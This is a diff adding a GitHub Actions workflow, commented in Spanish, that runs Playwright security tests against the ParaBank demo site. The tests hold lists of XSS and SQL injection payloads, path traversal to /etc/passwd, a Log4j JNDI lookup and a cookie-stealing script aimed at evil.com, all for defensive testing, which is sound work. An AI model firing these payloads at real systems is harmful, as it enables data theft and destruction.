@@ -1,0 +1,457 @@
+name: 🔒 Security Testing Suite
+
+on:
+  schedule:
+    # Ejecutar tests de seguridad cada lunes a las 6:00 AM UTC
+    - cron: '0 6 * * 1'
+  workflow_dispatch:
+    inputs:
+      security_scope:
+        description: 'Alcance de testing de seguridad'
+        required: true
+        default: 'basic'
+        type: choice
+        options:
+          - basic
+          - comprehensive
+          - xss
+          - injection
+
+env:
+  BASE_URL: https://parabank.parasoft.com/parabank
+
+jobs:
+  security-scan:
+    name: 🔒 Security Testing
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        test_type: [xss, injection, validation, headers]
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+
+      - name: 🟢 Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          cache: 'npm'
+
+      - name: 📦 Install dependencies
+        run: npm ci
+
+      - name: 🎭 Install Playwright browsers
+        run: npx playwright install --with-deps chromium
+
+      - name: 📁 Create security directories
+        run: |
+          mkdir -p security-results
+          mkdir -p security-evidence
+          mkdir -p security-reports
+
+      - name: 🔒 XSS Testing
+        if: matrix.test_type == 'xss' && (github.event.inputs.security_scope == 'xss' || github.event.inputs.security_scope == 'comprehensive' || github.event.inputs.security_scope == 'basic')
+        run: |
+          echo "🔒 Running XSS security tests..."
+          
+          # Crear test de XSS dinámico
+          cat > security-tests/xss-test.js << 'EOF'
+          const { test, expect } = require('@playwright/test');
+          
+          const XSS_PAYLOADS = [
+            '<script>alert("XSS")</script>',
+            '<img src="x" onerror="alert(1)">',
+            'javascript:alert("XSS")',
+            '<svg onload="alert(1)">',
+            '"><script>alert(1)</script>',
+            "'><script>alert(1)</script>",
+            '<iframe src="javascript:alert(1)"></iframe>',
+            '<body onload="alert(1)">',
+            '<input onfocus="alert(1)" autofocus>',
+            '<select onfocus="alert(1)" autofocus>'
+          ];
+          
+          test.describe('XSS Security Tests', () => {
+            XSS_PAYLOADS.forEach((payload, index) => {
+              test(`XSS Test ${index + 1}: ${payload.substring(0, 20)}...`, async ({ page }) => {
+                await page.goto(process.env.BASE_URL + '/parabank/contact.htm');
+                
+                // Llenar formulario con payload XSS
+                await page.fill('input[name="name"]', payload);
+                await page.fill('input[name="email"]', 'test@example.com');
+                await page.fill('input[name="phone"]', '1234567890');
+                await page.fill('input[name="message"]', payload);
+                
+                // Intentar submit
+                await page.click('input[value="Send to Customer Care"]');
+                
+                // Verificar que no se ejecutó JavaScript
+                const alertsTriggered = await page.evaluate(() => {
+                  return window.alertTriggered || false;
+                });
+                
+                expect(alertsTriggered).toBeFalsy();
+                
+                // Verificar que el payload fue sanitizado
+                const pageContent = await page.content();
+                expect(pageContent).not.toContain('<script>');
+                expect(pageContent).not.toContain('javascript:');
+                expect(pageContent).not.toContain('onerror=');
+                expect(pageContent).not.toContain('onload=');
+                expect(pageContent).not.toContain('onfocus=');
+                
+                await page.screenshot({ 
+                  path: `security-evidence/xss-test-${index + 1}.png` 
+                });
+              });
+            });
+          });
+          EOF
+          
+          mkdir -p security-tests
+          npx playwright test security-tests/xss-test.js \
+            --reporter=json \
+            --output=security-results/xss-results.json
+        continue-on-error: true
+
+      - name: 🔒 SQL Injection Testing
+        if: matrix.test_type == 'injection' && (github.event.inputs.security_scope == 'injection' || github.event.inputs.security_scope == 'comprehensive' || github.event.inputs.security_scope == 'basic')
+        run: |
+          echo "🔒 Running SQL Injection security tests..."
+          
+          cat > security-tests/injection-test.js << 'EOF'
+          const { test, expect } = require('@playwright/test');
+          
+          const SQL_PAYLOADS = [
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT * FROM users --",
+            "admin'--",
+            "admin' #",
+            "admin'/*",
+            "' OR 1=1--",
+            "' OR 'a'='a",
+            "') OR ('1'='1",
+            "' OR '1'='1' /*"
+          ];
+          
+          test.describe('SQL Injection Security Tests', () => {
+            SQL_PAYLOADS.forEach((payload, index) => {
+              test(`SQL Injection Test ${index + 1}: ${payload.substring(0, 15)}...`, async ({ page }) => {
+                await page.goto(process.env.BASE_URL + '/parabank/login.htm');
+                
+                // Intentar inyección SQL en campos de login
+                await page.fill('input[name="username"]', payload);
+                await page.fill('input[name="password"]', payload);
+                await page.click('input[value="Log In"]');
+                
+                // Verificar que no se bypasseó la autenticación
+                const currentUrl = page.url();
+                expect(currentUrl).not.toContain('/overview.htm');
+                expect(currentUrl).not.toContain('/accounts');
+                
+                // Verificar mensajes de error apropiados
+                const errorVisible = await page.locator('.error, [class*="error"], [id*="error"]').isVisible().catch(() => false);
+                // No fallar si no hay elemento de error, algunas apps no los muestran
+                
+                await page.screenshot({ 
+                  path: `security-evidence/injection-test-${index + 1}.png` 
+                });
+              });
+            });
+          });
+          EOF
+          
+          npx playwright test security-tests/injection-test.js \
+            --reporter=json \
+            --output=security-results/injection-results.json
+        continue-on-error: true
+
+      - name: 🔒 Input Validation Testing
+        if: matrix.test_type == 'validation' && (github.event.inputs.security_scope == 'comprehensive' || github.event.inputs.security_scope == 'basic')
+        run: |
+          echo "🔒 Running input validation security tests..."
+          
+          cat > security-tests/validation-test.js << 'EOF'
+          const { test, expect } = require('@playwright/test');
+          
+          const VALIDATION_PAYLOADS = [
+            'A'.repeat(10000), // Buffer overflow attempt
+            '../../../etc/passwd', // Path traversal
+            '../../../../windows/system32/drivers/etc/hosts',
+            '${jndi:ldap://evil.com/a}', // Log4j injection
+            '{{7*7}}', // Template injection
+            '<script>fetch("http://evil.com/"+document.cookie)</script>',
+            'test@example.com\r\nBcc: hacker@evil.com',
+            '"><iframe src="//evil.com"></iframe>',
+            '\x00\x01\x02\x03\x04\x05', // Null bytes
+            '\\x27\\x22\\x5c' // Escaped quotes and backslashes
+          ];
+          
+          test.describe('Input Validation Security Tests', () => {
+            VALIDATION_PAYLOADS.forEach((payload, index) => {
+              test(`Validation Test ${index + 1}: ${payload.substring(0, 20)}...`, async ({ page }) => {
+                await page.goto(process.env.BASE_URL + '/parabank/contact.htm');
+                
+                // Probar payload en diferentes campos
+                const testField = async (selector, fieldName) => {
+                  try {
+                    await page.fill(selector, payload);
+                    console.log(`✓ Tested ${fieldName} with payload ${index + 1}`);
+                  } catch (error) {
+                    console.log(`⚠ Could not test ${fieldName}: ${error.message}`);
+                  }
+                };
+                
+                await testField('input[name="name"]', 'name');
+                await testField('input[name="email"]', 'email');
+                await testField('input[name="phone"]', 'phone');
+                await testField('textarea[name="message"]', 'message');
+                
+                await page.click('input[value="Send to Customer Care"]');
+                
+                // Verificar que la aplicación manejó apropiadamente el input
+                const currentUrl = page.url();
+                const pageContent = await page.content();
+                
+                // No debería haber ejecutado código malicioso
+                expect(pageContent).not.toContain('evil.com');
+                expect(pageContent).not.toContain('/etc/passwd');
+                expect(pageContent).not.toMatch(/\$\{.*\}/);
+                
+                await page.screenshot({ 
+                  path: `security-evidence/validation-test-${index + 1}.png` 
+                });
+              });
+            });
+          });
+          EOF
+          
+          npx playwright test security-tests/validation-test.js \
+            --reporter=json \
+            --output=security-results/validation-results.json
+        continue-on-error: true
+
+      - name: 🔒 Security Headers Testing
+        if: matrix.test_type == 'headers' && (github.event.inputs.security_scope == 'comprehensive' || github.event.inputs.security_scope == 'basic')
+        run: |
+          echo "🔒 Running security headers tests..."
+          
+          cat > security-tests/headers-test.js << 'EOF'
+          const { test, expect } = require('@playwright/test');
+          
+          test.describe('Security Headers Tests', () => {
+            test('Check security headers', async ({ page }) => {
+              const response = await page.goto(process.env.BASE_URL + '/parabank/index.htm');
+              const headers = response.headers();
+              
+              console.log('Response headers:', headers);
+              
+              // Verificar headers de seguridad importantes
+              const securityHeaders = {
+                'x-frame-options': 'Should prevent clickjacking',
+                'x-content-type-options': 'Should prevent MIME sniffing',
+                'x-xss-protection': 'Should enable XSS protection',
+                'strict-transport-security': 'Should enforce HTTPS',
+                'content-security-policy': 'Should control resource loading'
+              };
+              
+              const missingHeaders = [];
+              const presentHeaders = [];
+              
+              Object.keys(securityHeaders).forEach(header => {
+                if (headers[header]) {
+                  presentHeaders.push({
+                    header: header,
+                    value: headers[header],
+                    description: securityHeaders[header]
+                  });
+                } else {
+                  missingHeaders.push({
+                    header: header,
+                    description: securityHeaders[header]
+                  });
+                }
+              });
+              
+              // Generar reporte
+              console.log('✅ Present security headers:', presentHeaders);
+              console.log('❌ Missing security headers:', missingHeaders);
+              
+              // No fallar el test, solo reportar
+              await page.screenshot({ path: 'security-evidence/headers-analysis.png' });
+            });
+            
+            test('Check HTTPS enforcement', async ({ page }) => {
+              // Verificar si la aplicación redirige a HTTPS
+              const httpUrl = process.env.BASE_URL.replace('https://', 'http://');
+              
+              try {
+                const response = await page.goto(httpUrl);
+                const finalUrl = response.url();
+                
+                if (finalUrl.startsWith('https://')) {
+                  console.log('✅ Application redirects HTTP to HTTPS');
+                } else {
+                  console.log('⚠ Application allows HTTP connections');
+                }
+              } catch (error) {
+                console.log('ℹ HTTP connection test failed (may be expected):', error.message);
+              }
+              
+              await page.screenshot({ path: 'security-evidence/https-test.png' });
+            });
+          });
+          EOF
+          
+          npx playwright test security-tests/headers-test.js \
+            --reporter=json \
+            --output=security-results/headers-results.json
+        continue-on-error: true
+
+      - name: 📊 Generate Security Report
+        run: |
+          echo "# 🔒 Security Test Report - ${{ matrix.test_type }}" > security-report-${{ matrix.test_type }}.md
+          echo "" >> security-report-${{ matrix.test_type }}.md
+          echo "**Test Type**: ${{ matrix.test_type }}" >> security-report-${{ matrix.test_type }}.md
+          echo "**Scope**: ${{ github.event.inputs.security_scope || 'basic' }}" >> security-report-${{ matrix.test_type }}.md
+          echo "**Date**: $(date)" >> security-report-${{ matrix.test_type }}.md
+          echo "**Target**: ${{ env.BASE_URL }}" >> security-report-${{ matrix.test_type }}.md
+          echo "" >> security-report-${{ matrix.test_type }}.md
+          
+          case "${{ matrix.test_type }}" in
+            "xss")
+              echo "## 🔒 XSS (Cross-Site Scripting) Testing" >> security-report-${{ matrix.test_type }}.md
+              echo "Tested application resistance to XSS attacks through form inputs." >> security-report-${{ matrix.test_type }}.md
+              ;;
+            "injection")
+              echo "## 🔒 SQL Injection Testing" >> security-report-${{ matrix.test_type }}.md
+              echo "Tested application resistance to SQL injection attacks in authentication." >> security-report-${{ matrix.test_type }}.md
+              ;;
+            "validation")
+              echo "## 🔒 Input Validation Testing" >> security-report-${{ matrix.test_type }}.md
+              echo "Tested application input validation and sanitization mechanisms." >> security-report-${{ matrix.test_type }}.md
+              ;;
+            "headers")
+              echo "## 🔒 Security Headers Analysis" >> security-report-${{ matrix.test_type }}.md
+              echo "Analyzed security headers and HTTPS enforcement." >> security-report-${{ matrix.test_type }}.md
+              ;;
+          esac
+          
+          echo "" >> security-report-${{ matrix.test_type }}.md
+          echo "## 📊 Test Results" >> security-report-${{ matrix.test_type }}.md
+          
+          # Verificar si hay resultados
+          if [ -f "security-results/${{ matrix.test_type }}-results.json" ]; then
+            echo "- ✅ **Tests executed**: Check JSON results for details" >> security-report-${{ matrix.test_type }}.md
+          else
+            echo "- ⚠️ **No results**: Tests may not have been executed" >> security-report-${{ matrix.test_type }}.md
+          fi
+          
+          echo "" >> security-report-${{ matrix.test_type }}.md
+          echo "## 📸 Evidence" >> security-report-${{ matrix.test_type }}.md
+          echo "Screenshots captured during testing:" >> security-report-${{ matrix.test_type }}.md
+          echo "" >> security-report-${{ matrix.test_type }}.md
+          
+          if [ -d "security-evidence" ]; then
+            for screenshot in security-evidence/${{ matrix.test_type }}-*.png security-evidence/*${{ matrix.test_type }}*.png; do
+              if [ -f "$screenshot" ]; then
+                echo "- ![$(basename "$screenshot")](./$screenshot)" >> security-report-${{ matrix.test_type }}.md
+              fi
+            done
+          fi
+
+      - name: 📊 Upload security results
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: security-results-${{ matrix.test_type }}
+          path: |
+            security-results/
+            security-evidence/
+            security-report-${{ matrix.test_type }}.md
+            security-tests/
+          retention-days: 60
+
+  security-summary:
+    name: 📋 Security Summary
+    runs-on: ubuntu-latest
+    needs: security-scan
+    if: always()
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+
+      - name: 📥 Download all security results
+        uses: actions/download-artifact@v4
+        with:
+          path: ./all-security-results
+
+      - name: 📊 Generate Master Security Report
+        run: |
+          echo "# 🔒 Master Security Test Report" > master-security-report.md
+          echo "" >> master-security-report.md
+          echo "**Generated**: $(date)" >> master-security-report.md
+          echo "**Scope**: ${{ github.event.inputs.security_scope || 'basic' }}" >> master-security-report.md
+          echo "**Target Application**: ${{ env.BASE_URL }}" >> master-security-report.md
+          echo "**Workflow Run**: [${{ github.run_number }}](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})" >> master-security-report.md
+          echo "" >> master-security-report.md
+          
+          echo "## 🎯 Security Test Summary" >> master-security-report.md
+          echo "" >> master-security-report.md
+          echo "| Test Type | Status | Evidence | Details |" >> master-security-report.md
+          echo "|-----------|--------|----------|---------|" >> master-security-report.md
+          
+          test_types=("xss" "injection" "validation" "headers")
+          
+          for test_type in "${test_types[@]}"; do
+            result_dir="./all-security-results/security-results-${test_type}"
+            if [ -d "$result_dir" ]; then
+              if [ -f "$result_dir/security-results/${test_type}-results.json" ]; then
+                status="✅ Executed"
+              else
+                status="⚠️ No Results"
+              fi
+              
+              evidence_count=0
+              if [ -d "$result_dir/security-evidence" ]; then
+                evidence_count=$(find "$result_dir/security-evidence" -name "*.png" | wc -l)
+              fi
+              
+              echo "| $test_type | $status | ${evidence_count} screenshots | [Report](./$result_dir/) |" >> master-security-report.md
+            else
+              echo "| $test_type | ❌ Failed | 0 | N/A |" >> master-security-report.md
+            fi
+          done
+          
+          echo "" >> master-security-report.md
+          echo "## 🔍 Security Recommendations" >> master-security-report.md
+          echo "" >> master-security-report.md
+          echo "### 🛡️ General Security Best Practices:" >> master-security-report.md
+          echo "1. **Input Sanitization**: Ensure all user inputs are properly sanitized" >> master-security-report.md
+          echo "2. **Output Encoding**: Encode data before displaying to users" >> master-security-report.md
+          echo "3. **Security Headers**: Implement comprehensive security headers" >> master-security-report.md
+          echo "4. **HTTPS Enforcement**: Force HTTPS for all communications" >> master-security-report.md
+          echo "5. **SQL Parameterization**: Use parameterized queries to prevent injection" >> master-security-report.md
+          echo "" >> master-security-report.md
+          
+          echo "## 📊 Test Coverage" >> master-security-report.md
+          echo "- **XSS Testing**: Cross-site scripting vulnerability assessment" >> master-security-report.md
+          echo "- **Injection Testing**: SQL injection vulnerability assessment" >> master-security-report.md
+          echo "- **Validation Testing**: Input validation and sanitization testing" >> master-security-report.md
+          echo "- **Headers Analysis**: Security headers and HTTPS enforcement" >> master-security-report.md
+          echo "" >> master-security-report.md
+          
+          echo "## 🔗 Detailed Reports" >> master-security-report.md
+          echo "Download individual security test reports from artifacts:" >> master-security-report.md
+          for test_type in "${test_types[@]}"; do
+            echo "- [${test_type} Security Report](./security-results-${test_type}/)" >> master-security-report.md
+          done
+
+      - name: 📊 Upload master security report
+        uses: actions/upload-artifact@v4
+        with:
+          name: master-security-report
+          path: master-security-report.md
+          retention-days: 90
